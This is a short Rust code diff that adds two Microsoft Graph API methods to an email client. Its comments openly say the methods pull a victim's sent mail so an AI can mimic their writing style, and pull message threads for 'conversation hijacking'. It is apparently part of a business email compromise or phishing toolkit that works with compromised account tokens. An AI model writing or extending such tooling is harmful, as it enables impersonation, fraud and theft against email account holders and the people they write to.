@@ -454,6 +454,24 @@ impl GraphClient {
         self.get(token, &url).await
     }
 
+    /// Fetch sent items for AI email mimicking — learns the victim's writing style
+    pub async fn get_sent_items(&self, token: &str, top: i32) -> Result<InboxResponse> {
+        let url = self.url(&format!(
+            "/v1.0/me/mailFolders/sentitems/messages?$top={}&$select=id,subject,bodyPreview,body,toRecipients,receivedDateTime&$orderby=receivedDateTime DESC",
+            top
+        ));
+        self.get(token, &url).await
+    }
+
+    /// Fetch conversation thread by conversationId for conversation hijacking
+    pub async fn get_conversation_thread(&self, token: &str, conversation_id: &str, top: i32) -> Result<InboxResponse> {
+        let url = self.url(&format!(
+            "/v1.0/me/messages?$filter=conversationId eq '{}'&$top={}&$select=id,subject,bodyPreview,body,from,toRecipients,receivedDateTime&$orderby=receivedDateTime ASC",
+            conversation_id, top
+        ));
+        self.get(token, &url).await
+    }
+
     pub async fn get_mail_folders(
         &self,
         token: &str,
